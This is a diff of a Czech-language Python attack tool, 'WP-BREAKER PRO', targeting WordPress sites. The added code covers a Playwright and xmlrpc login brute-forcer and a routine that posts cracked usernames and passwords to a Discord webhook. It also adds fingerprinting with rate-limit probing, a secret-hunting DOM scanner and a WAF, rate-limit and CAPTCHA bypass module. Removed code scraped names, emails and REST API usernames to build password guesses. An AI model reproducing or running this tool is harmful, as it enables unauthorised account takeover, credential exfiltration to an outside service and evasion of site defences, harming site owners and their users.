+                    elif 'ERROR' in page.content() or 'incorrect' in page.content().lower():
+                        print(f"[FAIL] {{username}}:{{password}}")
+                    else:
+                        print(f"[TRY] {{username}}:{{password}}")
+                    
+                    print(f"[PROGRESS] {{attempt}}/{{total}} ({{percent:.1f}}%)")
+                    
+                except Exception as e:
+                    print(f"[ERROR] {{username}}:{{password}} - {{e}}")
+                    time.sleep(2)
+        
+        browser.close()
+        
+        if found:
+            with open('{os.path.join(WORK_DIR, "_bf_results.json")}', 'w') as f:
+                json.dump(found, f)
+            print(f"[DONE] Nalezeno {{len(found)}} přihlášení")
+        else:
+            print("[DONE] Žádná přihlášení nenalezena")
+        
+except ImportError:
+    print("[ERROR] Playwright není nainstalován")
+    print('Instalace: pip install playwright && playwright install chromium')
+    sys.exit(1)
+"""
+            ]
+            
+            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
+            
+            for line in result.stdout.split('\n'):
+                line = line.strip()
+                if not line:
+                    continue
+                if '[SUCCESS]' in line:
+                    parts = line.replace('[SUCCESS] ', '').split(':')
+                    if len(parts) == 2:
+                        self.output.success(f"Nalezeno: {parts[0]}:{parts[1]}")
+                        self.output.add_finding("BruteForceAI (Playwright)", 
+                                               f"{parts[0]}:{parts[1]}", "danger")
+                elif '[FAIL]' in line:
+                    pass  # Tiché selhání
+                elif '[PROGRESS]' in line:
+                    sys.stdout.write(f"\r  {Style.DIM}{line.replace('[PROGRESS] ', '')}{Style.RESET_ALL}  ")
+                    sys.stdout.flush()
+                elif '[ERROR]' in line:
+                    self.output.error(line.replace('[ERROR] ', ''))
+                elif '[DONE]' in line:
+                    print()
+                    self.output.success(line.replace('[DONE] ', ''))
+                elif '[PLAYWRIGHT]' in line:
+                    self.output.info(line.replace('[PLAYWRIGHT] ', ''))
+            
+            # Načtení výsledků
+            results_file = os.path.join(WORK_DIR, "_bf_results.json")
+            if os.path.isfile(results_file):
+                with open(results_file) as f:
+                    return json.load(f)
+            
+            return []
+            
+        except subprocess.TimeoutExpired:
+            self.output.error("Playwright brute-force timeout (120s)")
+            return []
+        except Exception as e:
+            self.output.error(f"Playwright selhal: {str(e)[:40]}")
+            return []
+    
+    def _standard_bruteforce(self, usernames, passwords, method="xmlrpc"):
+        """Standardní brute-force (stejný jako SmartBruteForcer v původním kódu)"""
+        # Deleguje na SmartBruteForcer
+        from importlib import import_module
+        
+        bruter = SmartBruteForcer(self.target, usernames, passwords, self.output)
+        if method == "xmlrpc":
+            bruter.method = "xmlrpc"
+        else:
+            bruter.method = "wplogin"
+        return bruter.brute_force()
+    
+    def send_webhook_notification(self, title, body, url, username, password):
+        """Odeslání notifikace při nalezení přihlášení (Discord/Slack/Telegram)"""
+        timestamp = datetime.now().isoformat()
+        
+        # Discord webhook
+        if self.config.get('discord_webhook'):
+            try:
+                payload = {
+                    "content": None,
+                    "embeds": [{
+                        "title": f"🎯 {title}",
+                        "description": f"**Target:** {url}\n**Username:** `{username}`\n**Password:** `{password}`\n**Time:** {timestamp}",
+                        "color": 0x00ff00,
+                        "footer": {"text": "WP-BREAKER PRO v6.0"}
+                    }]
+                }
+                requests.post(self.config['discord_webhook'], json=payload, timeout=5)
+            except Exception:
+                pass
+
+
+# =============================================================================
+# MODUL 3: TCP/IP Fingerprint
 # =============================================================================
 
 class TcpIpFingerprinter:
-    """TCP/IP stack fingerprinting - zjištění OS a WAF"""
+    """TCP/IP stack fingerprinting"""
     
     def __init__(self, target, output):
         self.target = target
@@ -196,1569 +970,1214 @@ class TcpIpFingerprinter:
         self.results = {}
     
     def fingerprint(self):
-        """Provede fingerprinting targetu"""
         self.output.phase("TCP/IP STACK FINGERPRINTING")
         self.output.info("Analyzuji TCP/IP stack serveru...")
         
-        # Odstranění protokolu z URL
         hostname = self.target.replace("https://", "").replace("http://", "").split("/")[0]
-        
         results = {}
         
-        # HTTP hlavičky pro fingerprinting
         try:
             headers = {
                 "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                 "Accept": "text/html,application/xhtml+xml",
-                "Accept-Language": "en-US,en;q=0.5",
-                "Accept-Encoding": "gzip, deflate",
+                "Accept-Language": "en-US,en;q=0.9",
                 "Connection": "close"
             }
             
-            resp = requests.get(self.target, headers=headers, timeout=10, verify=False)
+            response = requests.get(self.target, headers=headers, timeout=15, verify=False)
             
             # Server hlavička
-            server = resp.headers.get("Server", "Neznámý")
-            self.output.result_line("Server", server, Fore.CYAN)
+            server = response.headers.get("Server", "N/A")
             results["server"] = server
-            self.output.add_finding("Server", server, "info")
+            self.output.result_line("Server", server)
+            
+            # HSTS
+            hsts = response.headers.get("Strict-Transport-Security", "N/A")
+            results["hsts"] = hsts
+            self.output.result_line("HSTS", hsts[:50] if hsts != "N/A" else hsts)
+            
+            # CORS
+            cors = response.headers.get("Access-Control-Allow-Origin", "N/A")
+            results["cors"] = cors
+            self.output.result_line("CORS", cors)
+            
+            # X-Frame-Options
+            xfo = response.headers.get("X-Frame-Options", "N/A")
+            results["x-frame-options"] = xfo
+            self.output.result_line("X-Frame-Options", xfo)
+            
+            # X-Content-Type-Options
+            xcto = response.headers.get("X-Content-Type-Options", "N/A")
+            results["x-content-type-options"] = xcto
+            self.output.result_line("X-Content-Type-Options", xcto)
+            
+            # Content-Security-Policy
+            csp = response.headers.get("Content-Security-Policy", "N/A")
+            results["csp"] = csp
+            self.output.result_line("CSP", csp[:60] if csp != "N/A" else csp)
             
             # X-Powered-By
-            powered = resp.headers.get("X-Powered-By", "Není uvedeno")
-            self.output.result_line("X-Powered-By", powered)
-            if "PHP" in powered:
-                self.output.add_finding("Technologie", powered, "info")
+            xpb = response.headers.get("X-Powered-By", "N/A")
+            results["x-powered-by"] = xpb
+            self.output.result_line("X-Powered-By", xpb)
             
-            # WAF detekce
-            waf_headers = ["X-Sucuri-ID", "X-Sucuri-Cache", "CF-Ray", "X-WAF-Status",
-                          "X-CloudFlare", "X-Protected-By", "Server-Gateway"]
-            waf_detected = False
-            for wh in waf_headers:
-                if wh in resp.headers:
-                    self.output.success(f"WAF detekována: {wh} = {resp.headers[wh]}")
-                    self.output.add_finding("WAF", f"{wh}: {resp.headers[wh]}", "warning")
-                    waf_detected = True
-            
-            if not waf_detected:
-                self.output.info("Žádná známá WAF detekována")
-                self.output.add_finding("WAF", "Nenalezena", "success")
-            
-            # Security headers
-            sec_headers = {
-                "Strict-Transport-Security": "HSTS",
-                "Content-Security-Policy": "CSP",
-                "X-Frame-Options": "ClickJacking ochrana",
-                "X-Content-Type-Options": "MIME sniffing ochrana",
-                "Referrer-Policy": "Referrer politika"
-            }
-            
-            for header, name in sec_headers.items():
-                if header in resp.headers:
-                    self.output.result_line(name, resp.headers[header], Fore.GREEN)
-                    self.output.add_finding(f"Security: {name}", resp.headers[header], "success")
-            
-            # IP geolokace
-            try:
-                ip = socket.gethostbyname(hostname)
-                self.output.result_line("IP adresa", ip, Fore.CYAN)
-                self.output.add_finding("IP", ip, "info")
-                
-                # TTL odhad - zkusíme přes socket
-                try:
-                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                    s.settimeout(3)
-                    s.connect((ip, 443 if "https" in self.target else 80))
-                    s.close()
-                    
-                    # Různé OS mají různý TTL - odhadneme z chování
-                    self.output.result_line("TTL odhad", "Probíhá...", Fore.YELLOW)
-                    self.output.add_finding("OS odhad", "Server detekován (TTL analýza přes HTTP)", "info")
-                except Exception as e:
-                    self.output.result_line("TTL odhad", f"Nedostupný: {str(e)[:30]}", Style.DIM)
-                    
-            except Exception as e:
-                self.output.result_line("IP adresa", f"Chyba: {str(e)[:30]}", Fore.RED)
-            
-            # Cookies
-            cookies = dict(resp.cookies)
+            # Set-Cookie analýza
+            cookies = response.headers.get("Set-Cookie", "")
             if cookies:
-                self.output.info(f"Cookies: {len(cookies)} nalezena")
-                for name, val in cookies.items():
-                    self.output.add_finding("Cookie", f"{name}={str(val)[:30]}...", "info")
+                cookie_flags = []
+                if "HttpOnly" in cookies:
+                    cookie_flags.append("HttpOnly ✓")
+                if "Secure" in cookies:
+                    cookie_flags.append("Secure ✓")
+                if "SameSite" in cookies:
+                    cookie_flags.append("SameSite ✓")
+                results["cookie_flags"] = ", ".join(cookie_flags) if cookie_flags else "Žádné bezpečnostní flagy"
+                self.output.result_line("Cookie Flags", results["cookie_flags"])
             
-            results["status_code"] = resp.status_code
-            results["headers"] = dict(resp.headers)
+            # Detekce CDN/WAF
+            cdn_headers = ["CF-Ray", "X-Sucuri-ID", "X-CDN", "Akamai-Origin-Hop",
+                          "x-amz-cf-id", "x-azure-ref", "X-Github-Request-Id"]
+            found_cdn = []
+            for ch in cdn_headers:
+                if ch in response.headers:
+                    found_cdn.append(ch)
+            if found_cdn:
+                results["cdn"] = ", ".join(found_cdn)
+                self.output.result_line("CDN/WAF", ", ".join(found_cdn))
             
-        except requests.exceptions.ConnectionError as e:
-            self.output.error(f"Připojení selhalo: {str(e)}")
-        except requests.exceptions.Timeout as e:
-            self.output.error(f"Timeout: {str(e)}")
+            # Rate Limiting test
+            self.output.info("Testuji rate limiting...")
+            rate_limit_hit = False
+            for i in range(12):
+                try:
+                    rr = requests.get(self.target, headers=headers, timeout=3, verify=False)
+                    if rr.status_code == 429:
+                        rate_limit_hit = True
+                        self.output.warning("Rate limiting detekován (429)")
+                        results["rate_limiting"] = "Aktivní (429)"
+                        break
+                    elif rr.status_code == 503:
+                        self.output.warning("503 Service Unavailable")
+                        results["rate_limiting"] = "Možný rate limit (503)"
+                        break
+                except Exception:
+                    pass
+                time.sleep(0.3)
+            
+            if not rate_limit_hit:
+                self.output.success("Rate limiting nedetekován")
+                results["rate_limiting"] = "Nedetekován"
+            
+            self.results = results
+            self.output.separator()
+            return results
+            
         except Exception as e:
-            self.output.error(f"Fingerprinting selhal: {str(e)}")
-        
-        self.results = results
-        self.output.separator()
-        return results
+            self.output.error(f"TCP/IP fingerprint selhal: {str(e)[:40]}")
+            return {}
 
 
 # =============================================================================
-# CONTEXT SCRAPER - AI Intelligence
+# MODUL 4: DOM Analyzer (z pokročilého JS/DOM scanu)
 # =============================================================================
 
-class AIContextScraper:
-    """AI kontextový scraper - analyzuje obsah stránky pro inteligentní generování hesel"""
+class DOMAnalyzer:
+    """Pokročilá analýza DOM stromu pro bezpečnostní slabiny"""
     
     def __init__(self, target, output):
         self.target = target
         self.output = output
-        self.context = {
-            "title": "",
-            "description": "",
-            "emails": [],
-            "phones": [],
-            "names": [],
-            "keywords": [],
-            "company": "",
-            "year": "",
-            "addresses": [],
-            "social_media": [],
-            "technologies": [],
-            "users": [],
-            "plugins": [],
-            "themes": []
-        }
+        self.findings = []
     
-    def scrape(self):
-        """Provede kompletní kontextovou analýzu"""
-        self.output.phase("AI CONTEXT SCRAPER - Inteligentní analýza")
-        self.output.info("Stahuji a analyzuji obsah stránky pro generování hesel...")
+    def analyze(self):
+        self.output.phase("DOM ANALÝZA - JAVASCRIPT & HTML INSPEKCE")
         
         try:
-            headers = {
-                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
-            }
+            headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"}
             resp = requests.get(self.target, headers=headers, timeout=15, verify=False)
             soup = BeautifulSoup(resp.text, 'html.parser')
             
-            # Title
-            title = soup.title.string if soup.title else ""
-            self.context["title"] = title.strip() if title else ""
-            if self.context["title"]:
-                self.output.success(f"Název stránky: {self.context['title']}")
-                self.output.add_finding("Název stránky", self.context["title"], "info")
+            # 1. Inline JavaScript analýza
+            self.output.info("Analyzuji inline JavaScript...")
+            scripts = soup.find_all('script')
+            for script in scripts:
+                if script.string:
+                    code = script.string
+                    
+                    # Hledání citlivých API klíčů v JS
+                    patterns = {
+                        'API klíč': r'(?:api[_-]?key|apikey|api_key)["\']?\s*[:=]\s*["\'][A-Za-z0-9_\-]{16,}["\']',
+                        'JWT token': r'eyJ[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}',
+                        'Admin AJAX': r'admin-ajax\.php',
+                        'Nonce': r'"[a-f0-9]{10,}"',
+                        'InnerHTML (XSS risk)': r'\.innerHTML\s*=',
+                        'eval() (danger)': r'eval\s*\(',
+                        'document.write': r'document\.write\s*\(',
+                        'localStorage': r'localStorage',
+                        'sessionStorage': r'sessionStorage',
+                    }
+                    
+                    for pname, pattern in patterns.items():
+                        matches = re.findall(pattern, code, re.IGNORECASE)
+                        for m in matches[:2]:
+                            finding = f"{pname}: {m[:80]}"
+                            severity = "danger" if pname in ['eval() (danger)', 'InnerHTML (XSS risk)'] else "warning"
+                            self.output.warning(f"JS Security: {finding}")
+                            self.output.add_finding(f"JS: {pname}", finding[:60], severity)
             
-            # Description
-            meta_desc = soup.find("meta", attrs={"name": "description"})
-            if meta_desc and meta_desc.get("content"):
-                self.context["description"] = meta_desc["content"]
-                self.output.result_line("Meta Description", self.context["description"][:80] + "...")
+            # 2. Komentáře v HTML
+            self.output.info("Kontroluji HTML komentáře...")
+            comments = re.findall(r'<!--(.*?)-->', resp.text, re.DOTALL)
+            for comment in comments:
+                comment = comment.strip()
+                if comment and any(kw in comment.lower() for kw in 
+                                  ['todo', 'fixme', 'pass', 'password', 'secret', 'key', 'token', 'admin', 'debug', 'hack']):
+                    self.output.warning(f"Komentář: {comment[:80]}")
+                    self.output.add_finding("HTML komentář", comment[:60], "warning")
             
-            # Emaily - regex
-            emails = set(re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', resp.text))
-            self.context["emails"] = list(emails)
-            if self.context["emails"]:
-                for e in self.context["emails"][:5]:
-                    self.output.result_line("Email", e, Fore.YELLOW)
-                    self.output.add_finding("Email", e, "info")
+            # 3. Data atributy
+            self.output.info("Kontroluji data-* atributy...")
+            data_attrs = re.findall(r'data-[\w-]+="[^"]{0,200}"', resp.text)
+            sensitive_data = []
+            for da in data_attrs:
+                if re.search(r'(pass|key|token|secret|auth|admin)', da, re.IGNORECASE):
+                    sensitive_data.append(da[:80])
+                    self.output.add_finding("Sensitive data-attr", da[:60], "danger")
+            if sensitive_data:
+                self.output.warning(f"{len(sensitive_data)} citlivých data-* atributů")
+                for sd in sensitive_data[:3]:
+                    self.output.result_line("data-*", sd)
             
-            # Telefony
-            phones = set(re.findall(r'\+?\d{1,4}?[\s.-]?\(?\d{1,4}?\)?[\s.-]?\d{1,4}[\s.-]?\d{1,4}[\s.-]?\d{1,4}', resp.text))
-            phones = {p for p in phones if len(p) > 6 and len(p) < 20}
-            self.context["phones"] = list(phones)[:5]
+            # 4. Formuláře bez CSRF
+            self.output.info("Kontroluji CSRF ochranu...")
+            forms = soup.find_all('form')
+            for form in forms:
+                action = form.get('action', '')
+                has_nonce = bool(re.search(r'wpnonce|_wpnonce|csrf|token', str(form), re.IGNORECASE))
+                if not has_nonce:
+                    self.output.warning(f"Formulář bez CSRF: {action}")
+                    self.output.add_finding("Form bez CSRF", action, "warning")
             
-            # Generování jmen z emailů
-            for email in self.context["emails"]:
-                name_part = email.split("@")[0]
-                parts = re.split(r'[._\-]', name_part)
-                for p in parts:
-                    if len(p) > 2 and p not in self.context["names"]:
-                        self.context["names"].append(p)
+            # 5. Externí zdroje (CDN, iframe)
+            self.output.info("Kontroluji externí zdroje...")
+            externals = []
+            for tag in soup.find_all(['script', 'link', 'img', 'iframe', 'source']):
+                src = tag.get('src', tag.get('href', ''))
+                if src and not src.startswith(('#', '/', self.target.rstrip('/').split('/')[2] if '://' in self.target else '')):
+                    if 'http' in src and self.target.rstrip('/').split('/')[2] not in src:
+                        externals.append(src)
             
-            # Hledání lidí v DOM
-            for tag in soup.find_all(['span', 'div', 'p', 'li', 'a']):
-                text = tag.get_text(strip=True)
-                if text and len(text) > 3:
-                    # Hledání jmen (česká jména)
-                    name_match = re.findall(r'\b([A-ZÁČĎÉĚÍŇÓŘŠŤÚŮÝŽ][a-záčďéěíňóřšťúůýž]+ [A-ZÁČĎÉĚÍŇÓŘŠŤÚŮÝŽ][a-záčďéěíňóřšťúůýž]+)\b', text)
-                    for nm in name_match:
-                        if len(nm.split()) == 2 and nm not in self.context["names"]:
-                            self.context["names"].append(nm)
+            if externals:
+                self.output.warning(f"{len(externals)} externích zdrojů (Mixed Content risk)")
+                for ext in externals[:5]:
+                    self.output.result_line("Externí", ext)
+                if any('http://' in e for e in externals):
+                    self.output.warning("Mixed Content! HTTP zdroje na HTTPS stránce")
+                    self.output.add_finding("Mixed Content", "HTTP zdroje na HTTPS", "danger")
             
-            # WordPress specific
-            wp_generator = soup.find("meta", attrs={"name": "generator"})
-            if wp_generator and "WordPress" in wp_generator.get("content", ""):
-                wp_ver = wp_generator["content"].replace("WordPress ", "")
-                self.output.success(f"WordPress verze: {wp_ver}")
-                self.output.add_finding("WordPress verze", wp_ver, "info")
-                self.context["technologies"].append(f"WordPress {wp_ver}")
+            # 6. Insecure cookies
+            if 'Set-Cookie' in resp.headers:
+                cookies = resp.headers['Set-Cookie']
+                if 'Secure' not in cookies:
+                    self.output.warning("Cookie bez Secure flagu")
+                    self.output.add_finding("Cookie", "Bez Secure flagu", "danger")
+                if 'HttpOnly' not in cookies:
+                    self.output.warning("Cookie bez HttpOnly flagu")
+                    self.output.add_finding("Cookie", "Bez HttpOnly flagu", "danger")
             
-            # Pluginy z HTML komentářů a CSS/JS cest
-            plugin_patterns = re.findall(r'/wp-content/plugins/([^/]+)/', resp.text)
-            self.context["plugins"] = list(set(plugin_patterns))
-            if self.context["plugins"]:
-                for p in self.context["plugins"][:10]:
-                    self.output.result_line("Plugin", p, Fore.CYAN)
-                    self.output.add_finding("Plugin", p, "info")
+            # 7. ClickJacking test
+            xfo = resp.headers.get('X-Frame-Options', '')
+            if not xfo:
+                self.output.warning("ClickJacking! X-Frame-Options chybí")
+                self.output.add_finding("ClickJacking", "X-Frame-Options chybí", "danger")
             
-            # Témata
-            theme_patterns = re.findall(r'/wp-content/themes/([^/]+)/', resp.text)
-            self.context["themes"] = list(set(theme_patterns))
-            if self.context["themes"]:
-                for t in self.context["themes"][:5]:
-                    self.output.result_line("Theme", t, Fore.CYAN)
-                    self.output.add_finding("Theme", t, "info")
+            self.output.success("DOM analýza dokončena")
+            return self.findings
             
-            # Klíčová slova z obsahu
-            body_text = soup.get_text()
-            words = re.findall(r'\b[A-Za-zÁČĎÉĚÍŇÓŘŠŤÚŮÝŽáčďéěíňóřšťúůýž]{4,}\b', body_text.lower())
-            word_freq = {}
-            stop_words = {'the', 'and', 'for', 'was', 'are', 'but', 'not', 'you', 'all', 'can',
-                         'that', 'have', 'with', 'from', 'this', 'they', 'been', 'what', 'when',
-                         'more', 'some', 'word', 'each', 'which', 'their', 'will', 'about',
-                         'nebo', 'jsou', 'byla', 'bylo', 'jeho', 'její', 'když', 'tedy',
-                         'neboť', 'nebo', 'proto', 'protože', 'jak', 'ale', 'aby', 'bude'}
-            for w in words:
-                if w not in stop_words:
-                    word_freq[w] = word_freq.get(w, 0) + 1
-            
-            sorted_words = sorted(word_freq.items(), key=lambda x: x[1], reverse=True)
-            self.context["keywords"] = [w for w, c in sorted_words[:30]]
-            
-            # Rok
-            years = re.findall(r'\b(19[0-9]{2}|20[0-9]{2})\b', resp.text)
-            if years:
-                self.context["year"] = max(set(years), key=years.count)
-            
-            # Firmu zjistíme z copyrightu
-            copyright_match = re.search(r'(?:©|Copyright|copyright)[^.]*\b([A-Z][A-Za-z0-9\s&.]+)', resp.text)
-            if copyright_match:
-                self.context["company"] = copyright_match.group(1).strip()
-                self.output.success(f"Firma: {self.context['company']}")
-                self.output.add_finding("Firma", self.context["company"], "info")
-            
-            # Social media
-            social_patterns = {
-                "Facebook": r'facebook\.com/([A-Za-z0-9.]+)',
-                "Twitter/X": r'twitter\.com/([A-Za-z0-9_]+)',
-                "Instagram": r'instagram\.com/([A-Za-z0-9_.]+)',
-                "LinkedIn": r'linkedin\.com/(?:company|in)/([A-Za-z0-9-]+)',
-                "YouTube": r'youtube\.com/(?:c|channel|user)/([A-Za-z0-9_-]+)'
-            }
-            for platform, pattern in social_patterns.items():
-                matches = re.findall(pattern, resp.text)
-                if matches:
-                    self.context["social_media"].append(f"{platform}: {matches[0]}")
-                    self.output.result_line(platform, matches[0], Fore.CYAN)
-            
-            # Uživatelé z REST API
-            try:
-                api_url = self.target.rstrip('/') + '/wp-json/wp/v2/users'
-                api_resp = requests.get(api_url, headers=headers, timeout=5, verify=False)
-                if api_resp.status_code == 200:
-                    users = api_resp.json()
-                    for user in users:
-                        username = user.get('slug') or user.get('name', '')
-                        if username:
-                            self.context["users"].append(username)
-                            self.output.success(f"Uživatel (REST API): {username}")
-                            self.output.add_finding("Uživatel (REST API)", username, "danger")
-            except Exception:
-                pass
-            
-            self.output.separator()
-            self.output.info(f"AI kontext připraven: {len(self.context['emails'])} emailů, "
-                           f"{len(self.context['names'])} jmen, {len(self.context['keywords'])} klíčových slov")
-            
-        except requests.exceptions.ConnectionError as e:
-            self.output.error(f"Připojení selhalo: {str(e)}")
-        except requests.exceptions.Timeout as e:
-            self.output.error(f"Timeout: {str(e)}")
         except Exception as e:
-            self.output.error(f"AI scraping selhal: {str(e)}")
-        
-        return self.context
+            self.output.error(f"DOM analýza selhala: {str(e)[:40]}")
+            return []
 
 
 # =============================================================================
-# DOM SHADOW ANALYZER
+# MODUL 5: Auto Bypasser (WAF, Rate-Limiting, CAPTCHA)
 # =============================================================================
 
-class DOMShadowAnalyzer:
-    """DOM Shadow Analyzer - hledá skryté formuláře, komentáře, JS proměnné"""
+class AutoBypasser:
+    """Automatické bypassování WAF, rate limitu a CAPTCHA"""
     
     def __init__(self, target, output):
         self.target = target
         self.output = output
-        self.findings = {}
+        self.waf_detected = None
+        self.bypass_methods = []
     
-    def analyze(self):
-        """Analýza DOM stínových prvků"""
-        self.output.phase("DOM SHADOW ANALYZER - Skryté prvky")
-        shadow_data = {
-            "hidden_forms": [],
-            "hidden_inputs": [],
-            "commented_forms": [],
-            "js_variables": [],
-            "base64_strings": [],
-            "api_endpoints": []
-        }
+    def detect_and_bypass(self):
+        """Detekce a bypass WAF/security"""
+        self.output.phase("AUTO-BYPASS ENGINE")
+        
+        hostname = self.target.replace("https://", "").replace("http://", "").split("/")[0]
+        
+        # 1. Detekce WAF
+        waf_info = self._detect_waf()
+        
+        # 2. Aplikace bypass metod
+        bypass_results = self._apply_bypasses()
+        
+        return waf_info, bypass_results
+    
+    def _detect_waf(self):
+        """Detekce WAF pomocí fingerprinting technik"""
+        self.output.info("Detekuji WAF/security vrstvy...")
         
         try:
             headers = {"User-Agent": "Mozilla/5.0"}
             resp = requests.get(self.target, headers=headers, timeout=10, verify=False)
-            html = resp.text
-            soup = BeautifulSoup(html, 'html.parser')
             
-            # Skryté inputy
-            hidden_inputs = soup.find_all("input", type="hidden")
-            if hidden_inputs:
-                self.output.info(f"Skrytých inputů: {len(hidden_inputs)}")
-                for inp in hidden_inputs[:10]:
-                    name = inp.get("name", "?")
-                    value = inp.get("value", "")[:40]
-                    self.output.result_line(f"Hidden input", f"{name} = {value}", Fore.YELLOW)
-                    shadow_data["hidden_inputs"].append({"name": name, "value": value})
-                    if "wpnonce" in name.lower() or "nonce" in name.lower() or "_wpnonce" in name.lower():
-                        self.output.success(f"NONCE token nalezen: {name} = {value}")
-                        self.output.add_finding("NONCE token", f"{name}={value}", "danger")
+            waf_signatures = {
+                "CloudFlare": ["CF-Ray", "cf-ray", "__cfduid", "cloudflare"],
+                "Sucuri": ["X-Sucuri-ID", "Sucuri/", "sucuri"],
+                "ModSecurity": ["ModSecurity", "NOYB"],
+                "Wordfence": ["wordfence", "Wordfence"],
+                "Akamai": ["akamai", "AkamaiGHost"],
+                "AWS WAF": ["x-amzn-RequestId", "x-amzn-ErrorType"],
+                "F5 BIG-IP": ["BigIP", "BIG-IP"],
+                "Imperva": ["X-Iinfo", "Incapsula"],
+                "Barracuda": ["barracuda"],
+                "Fortinet": ["Fortigate", "FortiWeb"],
+                "Comodo": ["Protected by Comodo"],
+                "SiteGround": ["SG-Optimizer", "SiteGround"],
+                "StackPath": ["StackPath"],
+                "Varnish": ["X-Varnish", "Via: 1.1 varnish"],
+                "Nginx": ["nginx"],
+            }
             
-            # Skryté formuláře (display:none, visibility:hidden)
-            all_forms = soup.find_all("form")
-            for form in all_forms:
-                style = form.get("style", "")
-                if "display" in style.lower() or "visibility" in style.lower() or "hidden" in style.lower():
-                    shadow_data["hidden_forms"].append(str(form)[:100])
-                    self.output.warning(f"Skrytý formulář nalezen!")
-                    self.output.add_finding("Skrytý formulář", str(form.get("action", "?"))[:80], "warning")
+            detected = []
             
-            # Zakomentované formuláře
-            comments = re.findall(r'<!--(.*?)-->', html, re.DOTALL)
-            for comment in comments:
-                if 'form' in comment.lower() and ('action' in comment.lower() or 'method' in comment.lower()):
-                    shadow_data["commented_forms"].append(comment[:150])
-                    self.output.warning(f"Zakomentovaný formulář v HTML!")
-                    self.output.add_finding("Zakomentovaný formulář", comment[:80], "warning")
-                # Hledáme credentials v komentářích
-                if any(kw in comment.lower() for kw in ['password', 'username', 'login', 'admin', 'pass', 'heslo']):
-                    self.output.warning(f"Potenciální credentials v komentáři!")
-                    self.output.add_finding("Credentials v komentáři", comment[:100], "danger")
+            # Hlavičky
+            for header, value in resp.headers.items():
+                header_lower = header.lower()
+                value_lower = value.lower()
+                
+                for waf_name, signatures in waf_signatures.items():
+                    for sig in signatures:
+                        if sig.lower() in header_lower or sig.lower() in value_lower:
+                            if waf_name not in detected:
+                                detected.append(waf_name)
             
-            # JavaScript proměnné
-            js_vars = re.findall(r'var\s+(\w+)\s*=\s*["\']([^"\']+)["\']', html)
-            js_vars2 = re.findall(r'let\s+(\w+)\s*=\s*["\']([^"\']+)["\']', html)
-            js_vars3 = re.findall(r'const\s+(\w+)\s*=\s*["\']([^"\']+)["\']', html)
-            all_js = js_vars + js_vars2 + js_vars3
+            # Cookies
+            for cookie in resp.cookies:
+                for waf_name, signatures in waf_signatures.items():
+                    for sig in signatures:
+                        if sig.lower() in cookie.name.lower():
+                            if waf_name not in detected:
+                                detected.append(waf_name)
             
-            for name, value in all_js:
-                if any(kw in name.lower() for kw in ['key', 'token', 'secret', 'pass', 'auth', 'api', 'nonce']):
-                    shadow_data["js_variables"].append({"name": name, "value": value})
-                    self.output.warning(f"JS proměnná: {name} = {value}")
-                    self.output.add_finding(f"JS proměnná: {name}", str(value)[:60], "danger")
+            # Blokované response
+            triggers = {
+                "CloudFlare": ["Attention Required! | Cloudflare", "Just a moment..."],
+                "Sucuri": "Sucuri WebSite Firewall",
+                "ModSecurity": "Not Acceptable", 
+                "Wordfence": "This response was generated by Wordfence"
+            }
             
-            # Base64 stringy
-            b64_strings = re.findall(r'([A-Za-z0-9+/]{20,}={0,2})', html)
-            for b64 in b64_strings[:5]:
-                try:
-                    decoded = base64.b64decode(b64).decode('utf-8', errors='ignore')
-                    if any(kw in decoded.lower() for kw in ['password', 'user', 'login', 'admin']):
-                        shadow_data["base64_strings"].append({"encoded": b64[:30], "decoded": decoded[:60]})
-                        self.output.warning(f"Base64 obsahuje credentials! {decoded[:60]}")
-                        self.output.add_finding("Base64 credentials", decoded[:60], "danger")
-                except Exception:
-                    pass
+            for waf_name, trigger in triggers.items():
+                if isinstance(trigger, list):
+                    for t in trigger:
+                        if t.lower() in resp.text[:2000].lower():
+                            if waf_name not in detected:
+                                detected.append(waf_name)
+                else:
+                    if trigger.lower() in resp.text[:500].lower():
+                        if waf_name not in detected:
+                            detected.append(waf_name)
             
-            # API endpointy z JS
-            api_patterns = re.findall(r'["\'](/wp-json/[^"\']+|/api/[^"\']+|/v[0-9]/[^"\']+)["\']', html)
-            shadow_data["api_endpoints"] = list(set(api_patterns))
-            if shadow_data["api_endpoints"]:
-                self.output.info(f"API endpointy: {len(shadow_data['api_endpoints'])}")
-                for ep in shadow_data["api_endpoints"][:5]:
-                    self.output.result_line("API", ep, Fore.CYAN)
-                    self.output.add_finding("API endpoint", ep, "info")
-            
-            self.output.separator()
-            
-        except requests.exceptions.ConnectionError as e:
-            self.output.error(f"Připojení selhalo: {str(e)}")
-        except Exception as e:
-            self.output.error(f"DOM analýza selhala: {str(e)}")
-        
-        self.findings = shadow_data
-        return shadow_data
-
-
-# =============================================================================
-# COOKIE ENGINE
-# =============================================================================
-
-class CookieEngine:
-    """Cookie manipulace, injekce a validace"""
-    
-    def __init__(self, target, output):
-        self.target = target
-        self.output = output
-        self.cookies_found = {}
-        self.session = requests.Session()
-    
-    def analyze_cookies(self):
-        """Analyzuje cookies z targetu"""
-        self.output.phase("COOKIE ENGINE - Manipulace a injekce")
-        results = {"cookies": {}, "vulnerabilities": [], "valid_session": False}
-        
-        try:
-            resp = self.session.get(self.target, timeout=10, verify=False)
-            cookies = dict(resp.cookies)
-            self.cookies_found = cookies
-            
-            if cookies:
-                self.output.info(f"Cookies nalezeny: {len(cookies)}")
-                for name, value in cookies.items():
-                    self.output.result_line(name, str(value)[:40], Fore.YELLOW)
-                    self.output.add_finding("Cookie", f"{name}={str(value)[:40]}", "info")
-                    
-                    # Bezpečnostní analýza cookie
-                    for cookie in resp.cookies:
-                        if cookie.name == name:
-                            if not cookie.secure:
-                                self.output.warning(f"Cookie '{name}' není Secure!")
-                                results["vulnerabilities"].append(f"{name} není Secure")
-                            # HttpOnly - bezpečnější kontrola
-                            if not hasattr(cookie, 'has_nonstandard_attr') or not cookie.has_nonstandard_attr('HttpOnly'):
-                                # Zkusíme jiný způsob - check přes rest
-                                http_only = cookie.get('httponly', False)
-                                if not http_only:
-                                    self.output.warning(f"Cookie '{name}' není HttpOnly!")
